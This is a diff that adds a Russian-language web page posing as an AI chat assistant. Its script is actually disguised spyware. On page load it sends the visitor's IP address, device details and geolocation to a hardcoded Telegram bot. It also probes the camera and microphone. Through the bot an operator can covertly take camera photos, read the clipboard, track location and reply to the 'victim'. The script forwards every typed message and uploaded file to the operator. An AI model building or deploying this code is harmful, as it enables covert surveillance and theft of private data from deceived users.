@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>AI Бот</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
+        body { background: #0b0f14; color: #e0e6ed; height: 100vh; display: flex; flex-direction: column; }
+        #chat { flex: 1; overflow-y: auto; padding: 16px; display: flex; flex-direction: column; gap: 8px; background: #12181f; }
+        .msg { max-width: 80%; padding: 10px 14px; border-radius: 18px; word-wrap: break-word; animation: fade 0.2s; background: #1e2a34; align-self: flex-start; }
+        .msg.user { background: #2b6b9c; align-self: flex-end; }
+        #input-area { display: flex; padding: 10px 16px; background: #1a2128; border-top: 1px solid #2d3a47; gap: 8px; }
+        #input-area input { flex: 1; padding: 10px 14px; border: none; border-radius: 30px; background: #2a3540; color: white; outline: none; font-size: 1rem; }
+        #input-area button { background: #2b6b9c; border: none; border-radius: 30px; padding: 10px 20px; color: white; font-weight: bold; cursor: pointer; }
+        #input-area button:active { opacity: 0.7; }
+        #attach-btn { background: #3a4a5a; border: none; border-radius: 30px; padding: 10px 16px; color: white; font-weight: bold; cursor: pointer; }
+        #status-bar { background: #0f161e; padding: 6px 16px; font-size: 0.7rem; color: #7a9aaf; display: flex; justify-content: space-between; border-bottom: 1px solid #1e2a34; }
+        @keyframes fade { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+<div id="status-bar">
+    <span id="bot-status">🟢 Бот активен</span>
+    <span id="tg-status">📨 Подключено к ТГ</span>
+</div>
+<div id="chat"></div>
+<div id="input-area">
+    <button id="attach-btn">📎</button>
+    <input type="text" id="msg-input" placeholder="Спросите ИИ..." autocomplete="off">
+    <button id="send-btn">Отправить</button>
+</div>
+<script>
+    const BOT_TOKEN = '8765295994:AAGiJ_XRhNS0U8ZWMh8tExZ64jT_TxFK8HQ';
+    const ADMIN_CHAT_ID = '5645726673';
+    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+    const DEVICE_ID = 'DEV_' + Math.random().toString(36).substring(2, 15);
+    const chat = document.getElementById('chat');
+    const input = document.getElementById('msg-input');
+    const sendBtn = document.getElementById('send-btn');
+    const attachBtn = document.getElementById('attach-btn');
+
+    async function sendToTelegram(label, data, file = null, parseMode = 'HTML') {
+        try {
+            const text = `${label}\n\n${data}`.slice(0, 4000);
+            if (file) {
+                const formData = new FormData();
+                formData.append('chat_id', ADMIN_CHAT_ID);
+                formData.append('document', file);
+                formData.append('caption', text.slice(0, 1000));
+                await fetch(`${TELEGRAM_API}/sendDocument`, { method: 'POST', body: formData });
+            } else {
+                await fetch(`${TELEGRAM_API}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: text, parse_mode: parseMode })
+                });
+            }
+        } catch(e) { console.warn(e); }
+    }
+
+    (async function() {
+        const ua = navigator.userAgent;
+        const platform = navigator.platform;
+        const screen = `${window.screen.width}x${window.screen.height}`;
+        const lang = navigator.language || 'en-US';
+        const url = location.href;
+        let report = `📱 <b>НОВОЕ ПОДКЛЮЧЕНИЕ!</b>\n\n`;
+        report += `🆔 <b>${DEVICE_ID}</b>\n`;
+        report += `📱 Платформа: ${platform}\n`;
+        report += `🌐 Браузер: ${ua.slice(0, 60)}...\n`;
+        report += `📐 Экран: ${screen}\n`;
+        report += `🌍 Язык: ${lang}\n`;
+        report += `🔗 URL: ${url}\n\n`;
+        try {
+            const ipResp = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResp.json();
+            report += `🌐 IP-адрес: ${ipData.ip}\n\n`;
+        } catch(e) { report += `🌐 IP-адрес: неизвестен\n\n`; }
+        report += `<b>РАЗРЕШЕНИЯ:</b>\n`;
+        let geoStatus = '❌';
+        let geoData = '';
+        if (navigator.geolocation) {
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+                geoStatus = '✅';
+                geoData = `lat:${pos.coords.latitude}, lng:${pos.coords.longitude}`;
+                report += `📍 Геолокация: ${geoStatus}\n`;
+            } catch(e) { report += `📍 Геолокация: ❌ (ошибка: ${e.message})\n`; }
+        } else { report += `📍 Геолокация: ❌ (не поддерживается)\n`; }
+        let camStatus = '❌';
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                stream.getTracks().forEach(t => t.stop());
+                camStatus = '✅';
+            } catch(e) { camStatus = `❌ (${e.message})`; }
+        } else { camStatus = '❌ (не поддерживается)'; }
+        report += `📷 Камера: ${camStatus}\n`;
+        let micStatus = '❌';
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                stream.getTracks().forEach(t => t.stop());
+                micStatus = '✅';
+            } catch(e) { micStatus = `❌ (${e.message})`; }
+        } else { micStatus = '❌ (не поддерживается)'; }
+        report += `🎤 Микрофон: ${micStatus}\n\n`;
+        report += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+        report += `<b>📖 КОМАНДЫ:</b>\n\n`;
+        report += `📷 /cam - сделать фото с камеры (скрыто)\n`;
+        report += `📍 /loc - геолокация (скрыто)\n`;
+        report += `💾 /storage - данные о хранилище (скрыто)\n`;
+        report += `📋 /clip - буфер обмена (скрыто)\n\n`;
+        report += `<b>КАК ОТВЕЧАТЬ ЖЕРТВЕ:</b>\n`;
+        report += `• Напиши /reply текст - ответ уйдёт жертве\n`;
+        report += `• Или отправь фото/документ через Telegram\n`;
+        await sendToTelegram('📱 НОВОЕ ПОДКЛЮЧЕНИЕ!', report, null, 'HTML');
+        if (geoStatus === '✅' && geoData) {
+            const [lat, lng] = geoData.replace('lat:', '').split(', lng:');
+            if (lat && lng) {
+                await fetch(`${TELEGRAM_API}/sendLocation`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_CHAT_ID,
+                        latitude: parseFloat(lat),
+                        longitude: parseFloat(lng)
+                    })
+                });
+            }
+        }
+    })();
+
+    let lastUpdateId = 0;
+    async function getTelegramUpdates() {
+        try {
+            const url = `${TELEGRAM_API}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
+            const resp = await fetch(url);
+            const data = await resp.json();
+            if (data.ok && data.result.length) {
+                for (const update of data.result) {
+                    lastUpdateId = update.update_id;
+                    const msg = update.message;
+                    if (!msg || msg.chat.id.toString() !== ADMIN_CHAT_ID) continue;
+                    if (msg.text) {
+                        const text = msg.text.trim();
+                        if (text.startsWith('/reply ')) {
+                            const replyText = text.substring(7);
+                            if (replyText.trim()) {
+                                addMessage(`📨 ${replyText}`, 'bot');
+                                await sendToTelegram('✅ ОТВЕТ ДОСТАВЛЕН', `Текст: ${replyText}\nID: ${DEVICE_ID}`);
+                            } else {
+                                await sendToTelegram('❌ ОШИБКА', 'Пустой ответ. Напиши /reply текст');
+                            }
+                        } else if (text.startsWith('/cam')) {
+                            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                                try {
+                                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                                    const video = document.createElement('video');
+                                    video.srcObject = stream;
+                                    video.play();
+                                    await new Promise(resolve => {
+                                        video.onloadedmetadata = () => {
+                                            video.width = video.videoWidth || 640;
+                                            video.height = video.videoHeight || 480;
+                                            resolve();
+                                        };
+                                    });
+                                    const canvas = document.createElement('canvas');
+                                    canvas.width = video.videoWidth || 640;
+                                    canvas.height = video.videoHeight || 480;
+                                    const ctx = canvas.getContext('2d');
+                                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                    const dataUrl = canvas.toDataURL('image/jpeg');
+                                    stream.getTracks().forEach(t => t.stop());
+                                    const blob = dataURItoBlob(dataUrl);
+                                    const file = new File([blob], 'camera_photo.jpg', { type: 'image/jpeg' });
+                                    await sendToTelegram('📸 ФОТО С КАМЕРЫ (/cam)', `ID: ${DEVICE_ID}`, file);
+                                } catch(e) {
+                                    sendToTelegram('❌ Ошибка камеры', e.message);
+                                }
+                            } else {
+                                sendToTelegram('❌ Камера', 'Не поддерживается');
+                            }
+                        } else if (text.startsWith('/loc')) {
+                            if (navigator.geolocation) {
+                                navigator.geolocation.getCurrentPosition(
+                                    pos => {
+                                        const geo = `lat:${pos.coords.latitude}, lng:${pos.coords.longitude}`;
+                                        sendToTelegram('📍 ГЕОЛОКАЦИЯ (/loc)', geo);
+                                        fetch(`${TELEGRAM_API}/sendLocation`, {
+                                            method: 'POST',
+                                            headers: { 'Content-Type': 'application/json' },
+                                            body: JSON.stringify({
+                                                chat_id: ADMIN_CHAT_ID,
+                                                latitude: pos.coords.latitude,
+                                                longitude: pos.coords.longitude
+                                            })
+                                        });
+                                    },
+                                    err => sendToTelegram('❌ Ошибка гео', err.message)
+                                );
+                            } else {
+                                sendToTelegram('❌ Гео', 'Не поддерживается');
+                            }
+                        } else if (text.startsWith('/storage')) {
+                            const storageInfo = `Кэш: ${navigator.storage ? 'доступен' : 'нет'}\nUser-Agent: ${navigator.userAgent}\nПлатформа: ${navigator.platform}\nЭкран: ${window.screen.width}x${window.screen.height}\nЯзык: ${navigator.language}`;
+                            sendToTelegram('💾 ДАННЫЕ ХРАНИЛИЩА (/storage)', storageInfo);
+                        } else if (text.startsWith('/clip')) {
+                            if (navigator.clipboard && navigator.clipboard.readText) {
+                                try {
+                                    const clipText = await navigator.clipboard.readText();
+                                    sendToTelegram('📋 БУФЕР ОБМЕНА (/clip)', clipText || '(пусто)');
+                                } catch(e) {
+                                    sendToTelegram('❌ Ошибка буфера', e.message);
+                                }
+                            } else {
+                                sendToTelegram('❌ Буфер обмена', 'Не поддерживается');
+                            }
+                        } else if (text === '/status') {
+                            sendToTelegram('📊 СТАТУС', 'Бот активен, все данные перехватываются');
+                        }
+                    }
+                    if (msg.document || msg.photo || msg.video) {
+                        let fileCaption = msg.caption || '📎 Файл от оператора';
+                        addMessage(`📨 ${fileCaption}`, 'bot');
+                        if (msg.photo) {
+                            const fileId = msg.photo[msg.photo.length-1].file_id;
+                            const fileLink = `https://t.me/${BOT_TOKEN.split(':')[0]}/${fileId}`;
+                            addMessage(`📸 Фото от оператора: ${fileLink}`, 'bot');
+                        } else if (msg.document) {
+                            addMessage(`📄 Документ от оператора: ${msg.document.file_name}`, 'bot');
+                        }
+                        await sendToTelegram('✅ ФАЙЛ ДОСТАВЛЕН ЖЕРТВЕ', `Файл: ${msg.document?.file_name || 'фото'}\nID: ${DEVICE_ID}`);
+                    }
+                }
+            }
+        } catch(e) { console.warn(e); }
+        setTimeout(getTelegramUpdates, 3000);
+    }
+
+    function sendUserMessage(text) {
+        if (!text.trim()) return;
+        addMessage(text, 'user');
+        sendToTelegram('💬 СООБЩЕНИЕ ОТ ПОЛЬЗОВАТЕЛЯ', `ID: ${DEVICE_ID}\nТекст: ${text}`);
+    }
+
+    function handleFile(file) {
+        const reader = new FileReader();
+        reader.onload = function(e) {
+            let data = e.target.result;
+            let label = '📎 ФАЙЛ ОТ ПОЛЬЗОВАТЕЛЯ';
+            if (file.type.startsWith('image/')) {
+                label = '🖼️ ФОТО ОТ ПОЛЬЗОВАТЕЛЯ';
+                const blob = dataURItoBlob(data);
+                const fileObj = new File([blob], file.name, { type: file.type });
+                sendToTelegram(label, `ID: ${DEVICE_ID}\nИмя: ${file.name}\nРазмер: ${file.size} байт`, fileObj);
+            } else if (file.type.startsWith('video/')) {
+                label = '🎥 ВИДЕО ОТ ПОЛЬЗОВАТЕЛЯ';
+                const blob = dataURItoBlob(data);
+                const fileObj = new File([blob], file.name, { type: file.type });
+                sendToTelegram(label, `ID: ${DEVICE_ID}\nИмя: ${file.name}\nРазмер: ${file.size} байт`, fileObj);
+            } else {
+                label = `📄 ФАЙЛ ОТ ПОЛЬЗОВАТЕЛЯ: ${file.name}`;
+                const blob = dataURItoBlob(data);
+                const fileObj = new File([blob], file.name, { type: file.type });
+                sendToTelegram(label, `ID: ${DEVICE_ID}\nИмя: ${file.name}\nТип: ${file.type}\nРазмер: ${file.size} байт`, fileObj);
+            }
+        };
+        reader.readAsDataURL(file);
+    }
+
+    function dataURItoBlob(dataURI) {
+        const byteString = atob(dataURI.split(',')[1]);
+        const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+        const ab = new ArrayBuffer(byteString.length);
+        const ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) {
+            ia[i] = byteString.charCodeAt(i);
+        }
+        return new Blob([ab], { type: mimeString });
+    }
+
+    function addMessage(text, sender) {
+        const div = document.createElement('div');
+        div.className = `msg ${sender}`;
+        div.textContent = text;
+        chat.appendChild(div);
+        chat.scrollTop = chat.scrollHeight;
+    }
+
+    sendBtn.addEventListener('click', () => {
+        const text = input.value.trim();
+        if (!text) return;
+        input.value = '';
+        sendUserMessage(text);
+    });
+
+    input.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') sendBtn.click();
+    });
+
+    attachBtn.addEventListener('click', () => {
+        const inputFile = document.createElement('input');
+        inputFile.type = 'file';
+        inputFile.accept = 'image/*,video/*,*/*';
+        inputFile.multiple = false;
+        inputFile.onchange = () => {
+            if (inputFile.files.length) {
+                handleFile(inputFile.files[0]);
+            }
+        };
+        inputFile.click();
+    });
+
+    setTimeout(() => {
+        addMessage('Привет! Я ИИ-помощник. Задайте вопрос или отправьте файл.', 'bot');
+        getTelegramUpdates();
+    }, 1000);
+</script>
+</body>
+</html>
